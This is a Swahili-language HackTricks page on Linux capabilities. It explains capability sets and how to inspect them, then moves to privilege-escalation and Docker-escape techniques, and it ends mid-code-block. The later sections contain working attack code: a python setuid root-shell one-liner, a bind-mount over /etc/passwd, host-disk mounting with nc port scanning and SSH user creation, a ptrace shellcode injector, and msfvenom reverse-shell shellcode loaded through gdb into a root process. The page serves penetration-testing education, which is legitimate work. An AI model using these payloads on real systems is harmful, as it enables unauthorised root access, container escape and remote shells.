# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities hugawa **haki za root katika vitengo vidogo na tofauti**, na kuruhusu michakato kuwa na sehemu tu ya haki hizo. Hii hupunguza hatari kwa kutopea haki zote za root bila sababu.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Tatizo:

- Watumiaji wa kawaida wana ruhusa chache za kufanya shughuli kama kufungua raw sockets au kufunga Internet ports zilizo chini ya 1024; capabilities zinaweza kutoa ruhusa ya kufanya shughuli inayohitajika pekee badala ya haki zote za root.<sup>[[14]](#references)</sup>

### Seti za Capabilities:

Linux hutoa seti hizi za capabilities kwa kila thread, na kernel hutekeleza vizuizi vyake mchakato unapobadilisha credentials au kutekeleza faili.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **Madhumuni**: Hubainisha capabilities zinazoweza kuchangia kwenye seti ya permitted baada ya `execve()` ikiwa faili inayotekelezwa ina file capabilities za inheritable zinazolingana.
   - **Utendaji**: Seti ya inheritable ya thread huhifadhiwa katika `execve()`; yenyewe haiwafanyi capabilities hizo ziwe effective.
   - **Vizuizi**: Kuongeza capability kwenye seti hii kunazuiwa na seti za permitted na bounding.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **Madhumuni**: Huonyesha capabilities ambazo mchakato unatumia kwa sasa.
   - **Utendaji**: Hii ndiyo seti ya capabilities ambazo kernel hukagua ili kutoa ruhusa za shughuli mbalimbali. Kwa faili, seti hii inaweza kuwa flag inayoonyesha ikiwa capabilities za permitted za faili zinapaswa kuchukuliwa kuwa effective.
   - **Umuhimu**: Seti ya effective ni muhimu kwa ukaguzi wa ruhusa wa papo hapo, ikiwa kama seti hai ya capabilities ambazo mchakato unaweza kutumia.

3. **Permitted (CapPrm)**:

   - **Madhumuni**: Hufafanua seti ya juu kabisa ya capabilities ambazo mchakato unaweza kuwa nazo.
   - **Utendaji**: Mchakato unaweza kuhamisha capability kutoka kwenye seti ya permitted hadi kwenye seti yake ya effective, na hivyo kuweza kuitumia. Pia unaweza kuondoa capabilities kwenye seti yake ya permitted.
   - **Kikomo**: Capability ikiondolewa kwenye seti hii, kwa kawaida haiwezi kurejeshwa bila kutekeleza faili inayoitoa au kufanyika kwa mabadiliko mengine ya upendeleo.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **Madhumuni**: Huweka kikomo kwa capabilities ambazo mchakato unaweza kupata kutoka kwenye faili wakati wa `execve()` na zile unazoweza kuongeza kwenye seti yake ya inheritable.
   - **Utendaji**: Seti hii hurithiwa kupitia `fork()` na huhifadhiwa kupitia `execve()`; capabilities zinaweza kuondolewa kutoka humo ikiwa mwitaji ana `CAP_SETPCAP`.
   - **Matumizi**: Kuondoa capabilities zisizohitajika kwenye seti hii hupunguza uwezo wa kupata upendeleo zaidi baadaye.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Madhumuni**: Huruhusu capabilities zilizochaguliwa kubaki permitted na effective wakati wa `execve()` ya programu isiyo na upendeleo.
   - **Utendaji**: Capabilities za ambient huongezwa kwenye seti mpya za permitted na effective ikiwa faili inayotekelezwa haina upendeleo.
   - **Vizuizi**: Capability inaweza kuwa ambient tu ikiwa ipo katika seti za permitted na inheritable; kutekeleza faili ya set-user-ID/set-group-ID au faili yenye capabilities husafisha seti ya ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities za Processes na Binaries

### Capabilities za Processes

Ili kuona capabilities za mchakato fulani, tumia faili ya **status** katika saraka ya /proc. Kwa kuwa faili hiyo hutoa maelezo zaidi, tuangalie taarifa zinazohusiana na Linux capabilities pekee.\
Kumbuka kwamba kwa michakato yote inayoendeshwa, taarifa za capabilities huhifadhiwa kwa kila thread, huku file capabilities zikihifadhiwa katika extended attributes za `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Unaweza kupata capabilities zilizofafanuliwa katika /usr/include/linux/capability.h

Unaweza kupata capabilities za mchakato wa sasa kwa kutumia `cat /proc/self/status` au `capsh --print`, na capabilities za michakato mingine katika `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Amri hii inapaswa kurudisha mistari mitano ya capabilities kwenye mifumo mingi.<sup>[[15]](#references)</sup>

- CapInh = Capabilities zilizorithiwa
- CapPrm = Capabilities zinazoruhusiwa
- CapEff = Capabilities zinazotumika
- CapBnd = Seti ya mipaka
- CapAmb = Seti ya capabilities za mazingira ya sasa

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Nambari hizi za heksadesimali hazina maana. Kwa kutumia zana ya `capsh`, tunaweza kuzibadilisha kuwa majina ya capabilities.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Hebu sasa tuchunguze **capabilities** zinazotumiwa na `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Ingawa hiyo inafanya kazi, kuna njia nyingine rahisi zaidi. Ili kuona capabilities za mchakato unaoendeshwa, tumia zana ya **getpcaps** ikifuatiwa na kitambulisho cha mchakato (PID); pia inakubali orodha ya vitambulisho vya michakato.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Tuchunguze uwezo wa `tcpdump` baada ya kuipa binary `cap_net_admin` na `cap_net_raw` ili kunasa trafiki ya mtandao (`tcpdump` inaendeshwa katika process 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Kama unavyoona, capabilities zinaendana na matokeo ya njia mbili za kukagua mchakato. Zana ya `getpcaps` hutumia libcap kuuliza capabilities za mchakato lengwa na kuzichapisha kwa muundo wa maandishi; hukubali PID moja au zaidi.<sup>[[22]](#references)</sup>

### Capabilities za Binaries

Binaries zinaweza kuwa na file capabilities zinazotumika wakati wa utekelezaji. Kwa mfano, binary ya `ping` inaweza kuwa na capability ya `cap_net_raw`.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Unaweza **kutafuta binaries zenye capabilities** kwa kutumia `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Kuondoa capabilities kwa kutumia capsh

Tukiondoa `CAP_NET_RAW` kwenye seti ya mipaka inayotumika sasa, programu inayohitaji uwezo huo haipaswi tena kuweza kuutumia.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Mbali na matokeo ya _capsh_ yenyewe, amri ya _tcpdump_ yenyewe pia inapaswa kutoa hitilafu.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Hitilafu inaonyesha kuwa `tcpdump` haiwezi kutekelezwa ikiwa na uwezo wa faili ulioombwa baada ya `CAP_NET_RAW` kuondolewa kwenye seti ya mipaka.

### Ondoa Uwezo

Unaweza kuondoa uwezo wa faili kwa kutumia `setcap -r`.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Capabilities za Mtumiaji

Linux haiweki capabilities za faili moja kwa moja kwa mtumiaji anayeingia, lakini moduli ya PAM `pam_cap` inaweza kuweka capabilities zinazoweza kurithiwa kwa vipindi vilivyothibitishwa kwa kutumia `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Kila ingizo huunganisha majina au nambari za capabilities zilizotenganishwa kwa koma na jina moja au zaidi la watumiaji.<sup>[[17]](#references)</sup>
Mfano wa faili:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Uwezo wa Mazingira

Kukompile programu ifuatayo huwezesha **kuanzisha shell ya bash ndani ya mazingira yanayotoa capabilities**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Ndani ya **bash inayotekelezwa na binary ya ambient iliyokusanywa**, inawezekana kuona **capabilities mpya** (mtumiaji wa kawaida hatakuwa na capability yoyote katika sehemu ya "current").<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Unaweza **kuongeza tu capabilities zilizopo katika seti zote mbili: permitted na inheritable**.<sup>[[14]](#references)</sup>

### Binari za Capability-aware/Capability-dumb

Capability-dumb binary ni programu yenye file capabilities ambayo haitumii libcap kuzidhibiti. Ikiwa biti yake ya file effective imewekwa, kernel huwasha permitted capabilities za faili katika effective set ya process; utekelezaji unaweza kushindwa ikiwa process haikupata permitted capabilities zote.<sup>[[14]](#references)</sup>

## Capabilities za Huduma

Huduma ya mfumo inayoendeshwa kama root inaweza kuhifadhi capabilities pana isipokuwa mazingira yake ya utekelezaji yazizuie. Katika unit ya systemd, `User=` huchagua mtumiaji wa huduma na `AmbientCapabilities=` huongeza capabilities zilizotajwa kwenye ambient set ya process inayoendeshwa.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Capabilities katika Docker Containers

Docker huanzisha containers kwa seti chaguomsingi ya capabilities inayoweza kubadilishwa kwa kutumia `--cap-add` na `--cap-drop`; container ya mfano inaweza kukaguliwa kwa `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities ni muhimu **unapotaka kuzuia michakato yako mwenyewe baada ya kutekeleza shughuli zenye upendeleo** (kwa mfano, baada ya kusanidi chroot na kufunga kwenye socket). Hata hivyo, zinaweza kutumiwa vibaya kwa kuzipitishia amri au hoja hasidi ambazo kisha huendeshwa kama root.<sup>[[2]](#references)</sup>

Unaweza kulazimisha programu ziwe na file capabilities ukitumia `setcap`, na kuzikagua ukitumia `getcap`.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

Kwa maandishi ya file-capability, `+ep` huongeza capability iliyotajwa kwenye seti za effective na permitted; `-` hupunguza flags zilizochaguliwa.<sup>[[21]](#references)</sup>

Ili kubaini programu zilizo na capabilities kwenye mfumo au folda, tumia `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Mfano wa exploitation

Katika mfano ufuatao, binary `/usr/bin/python2.6` imepatikana kuwa katika hatari ya privesc:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** zinazohitajika na `tcpdump` ili **kuruhusu mtumiaji yeyote kunasa paketi**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Hali maalum ya jina la capability lililoachwa wazi

Katika umbizo la maandishi la libcap, `getcap myelf` ikiripoti `myelf =ep` humaanisha kwamba **capabilities zote** zimewekwa kuwa effective na permitted, kwa kuzingatia bounding set ya process inayotekelezwa, user namespace na vizuizi vingine vya utekelezaji. Seti tupu ya file capability ni `myelf =` (bila `e` au `p`); ni tofauti na faili lisilo na sifa ya capability. Faili la `=ep` lenyewe halibadilishi UID ya process kuwa root, lakini programu inayoweza kutumia `CAP_DAC_READ_SEARCH` au `CAP_DAC_OVERRIDE` inaweza kusoma faili ambazo Unix UID yake isingeweza kusoma vinginevyo. Thibitisha file mode, namespace na effective capabilities za executable halisi kabla ya kuchukulia chaguo zake za ingizo kama njia ya kusoma faili yenye privileged access. Tazama [umbizo la maandishi la capability](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) la libcap na [tabia ya thamani tupu](https://man7.org/linux/man-pages/man8/getcap.8.html).<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ni Linux capability yenye nguvu sana, ambayo mara nyingi huchukuliwa kuwa karibu na kiwango cha root kutokana na **haki zake pana za usimamizi**, kama vile ku-mount vifaa au kuchezea vipengele vya kernel. Ingawa ni muhimu kwa containers zinazoiga mifumo mizima, **`CAP_SYS_ADMIN` huleta changamoto kubwa za usalama**, hasa katika mazingira ya container, kutokana na uwezekano wake wa kusababisha privilege escalation na kuvuruga mfumo. Kwa hiyo, matumizi yake yanahitaji tathmini kali za usalama na usimamizi makini; inapendekezwa sana kuondoa capability hii kwenye application-specific containers ili kufuata **kanuni ya ruhusa za chini kabisa** na kupunguza attack surface.<sup>[[14]](#references)</sup>

Kwa mabadiliko ya namespace, wigo ni muhimu: `setns()` hukagua `CAP_SYS_ADMIN` kulingana na user namespace inayomiliki namespace lengwa. Kuingia kwenye mount namespace pia kunahitaji `CAP_SYS_CHROOT` katika user namespace ya caller. Hivyo, capability iliyo ndani ya private remapped user namespace pekee haitoi ruhusa ya kuingia kiholela kwenye initial host namespaces.<sup>[[14]](#references)</sup>

**Mfano wenye binary**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Kwa kutumia Python unaweza ku-mount faili ya _passwd_ iliyorekebishwa juu ya faili halisi ya _passwd_:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

Na hatimaye **mount** faili ya `passwd` iliyorekebishwa kwenye `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

Na utaweza kutumia **`su` kama root** kwa kutumia nenosiri "password".

**Mfano wa kutumia environment (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya docker container kwa kutumia:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Katika matokeo yaliyotangulia unaweza kuona kuwa uwezo wa SYS_ADMIN umewashwa.<sup>[[14]](#references)</sup>

- **Mount**

Kwa ufikiaji unaofaa wa kifaa na namespace, hii inaweza kuruhusu kontena la Docker **kufanya mount ya diski ya host na kufikia yaliyomo**. Node ya kifaa lazima iwakilishe kifaa halisi cha host, cgroup ya kifaa lazima iruhusu ufikiaji huo, na kufanya mount ya mfumo wa faili unaotegemea block kunahitaji `CAP_SYS_ADMIN` katika namespace ya awali ya user.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Ufikiaji kamili**

Katika mbinu iliyotangulia tuliweza kufikia diski ya host.\
Ikiwa host inaendesha seva ya **ssh**, unaweza **kuunda mtumiaji ndani ya diski iliyowekwa mount** na kuifikia kupitia SSH.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Usomaji na uandikaji wa moja kwa moja ndani ya `/mnt/host` tayari ni ufikiaji wa mfumo wa faili wa host. `chroot` ya mwisho ni njia rahisi tu ya kutumia majina ya njia, na pia inahitaji `CAP_SYS_CHROOT`; si hatua inayowezesha escape.

## CAP_SYS_PTRACE

Kwa `CAP_SYS_PTRACE`, mchakato unaweza kufuatilia na kukagua michakato mingine inayoonekana katika PID namespace yake. Ili kulenga michakato ya host kutoka kwenye Docker container, tumia PID namespace ya host kwa `--pid=host` (au jiunge na namespace iliyo na mchakato unaolengwa).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** hutoa uwezo wa kutumia utatuzi wa programu na ufuatiliaji wa system call unaotolewa na `ptrace(2)`, pamoja na miito ya kuambatisha kwenye kumbukumbu za michakato kama `process_vm_readv(2)` na `process_vm_writev(2)`. Ingawa ni muhimu kwa utambuzi na ufuatiliaji, kuwasha `CAP_SYS_PTRACE` bila hatua zenye vizuizi, kama vile kichujio cha seccomp kwenye `ptrace(2)`, kunaweza kudhoofisha usalama wa mfumo kwa kiasi kikubwa. Hasa, inaweza kutumiwa kukwepa vizuizi vingine vya usalama, hasa vile vinavyowekwa na seccomp, kama inavyoonyeshwa na [proofs of concept (PoC) kama huu](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Mfano kwa binary (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Mfano wa binary (gdb)**

`gdb` yenye uwezo wa `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Capability kwenye debugger ni kidokezo cha ukaguzi tu. Thibitisha kama mchakato wa sasa unaweza kutekeleza faili hilo hasa (ikiwemo ruhusa za group na ACL), kama `CAP_SYS_PTRACE` itakuwa effective baada ya utekelezaji, na kama target yenye privileged zaidi inaonekana na inaweza kuambatishwa katika PID namespace hiyo hiyo. `no_new_privs`, mount ya `nosuid`, capability bounding set, Yama, seccomp au LSM vinaweza kubadilisha matokeo. Tazama [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) na [nyaraka za Yama za kernel](https://docs.kernel.org/admin-guide/LSM/Yama.html). Orodhesha metadata ya faili na mchakato bila kuambatishwa kwenye target.

Tengeneza shellcode kwa kutumia msfvenom ili kuiingiza kwenye memory kupitia gdb

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Fanya debugging ya process ya root kwa gdb na unakili-kubandika mistari ya gdb iliyotengenezwa awali:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Mfano wenye mazingira (Docker breakout) - Unyanyasaji mwingine wa gdb**

Ikiwa **GDB** imesakinishwa (au unaweza kuisakinisha kwa `apk add gdb` au `apt install gdb`, kwa mfano), unaweza kufanya **debug** ya process inayoonekana ya host na kuifanya iite function ya `system`. Hili linahitaji `CAP_SYS_PTRACE` yenye ufanisi katika user namespace ya lengo na uwezo wa kuona PID za host; **halihitaji** `CAP_SYS_ADMIN`. Yama, hali ya non-dumpable, seccomp, na sera ya LSM bado zinaweza kuzuia kuambatisha.

```bash
gdb -p 1234
